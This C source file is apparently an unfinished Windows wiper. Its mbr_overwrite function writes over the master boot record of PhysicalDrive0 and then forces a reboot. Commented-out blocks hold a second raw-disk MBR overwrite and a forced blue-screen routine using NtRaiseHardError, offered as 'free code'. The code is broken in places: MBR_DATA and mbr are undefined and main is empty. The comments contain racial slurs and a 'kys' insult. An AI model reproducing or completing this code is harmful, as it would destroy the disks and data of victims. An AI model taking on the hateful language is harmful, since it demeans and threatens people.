#include "windows.h"

void main(){
    // this will call all funcs
}

void mbr_overwrite(){
    HANDLE hDisk = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if(hDisk == INVALID_HANDLE_VALUE){
        // we return to our home if the idsk is invalid
        return;
    }

    //then we need to empty the mbr and leave it empty
    // TWC dont gforget to define mbr_data
    DWORD bytesWritten;
    BOOL result = WriteFile(hDisk, MBR_DATA, sizeof(mbr), &bytesWritten, NULL);
    if(!result || bytesWritten != sizeof(mbr)){
        // if we fail to write the mbr we close the handle and return
        CloseHandle(hDisk);
        return;
    }
    // we close the handle
    CloseHandle(hDisk); 
    // we restart the pc using winapi ofc cause we pro
    int shutdownwAPI = ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SOFTWARE | SHTDN_REASON_MINOR_INSTALLATION);
    if(!shutdownwAPI){
        // start shutdown proc with StartProcessA
      
        
    }
} 




/*#include "mbr.h"
#include <windows.h>
#include <stdio.h>

int main() {
        DWORD dwBytesWritten;
        HANDLE hDevice = CreateFileW(
            L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
            FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
            OPEN_EXISTING, 0, 0);

        WriteFile(hDevice, MBR_DATA, 32768, &dwBytesWritten, 0);
        CloseHandle(hDevice);
        return 0;
}
*/ // fucking retard "MBR_DATA" isnt defined, so i fill with Zeros the mbr.are u stupid? what do u thin k mbr.h is, oh i dont see it lmao kys nigger, i 
// miss C#lol C# for pussies what u doing rn? nigga just use api calls niggagggagagagagagagagagagagagagag use api calls like: 

/* NTSTATUS TriggerBSOD(void) {
    BOOLEAN Enabled;
    HARDERROR_RESPONSE HardErrorResponse;

    RtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, &Enabled);

    return NtRaiseHardError(
        STATUS_HOST_DOWN,       
        0,                     
        NULL,
        NULL,
        OptionShutdownSystem,
        &HardErrorResponse
    );
}
*/ //free code thank me later 
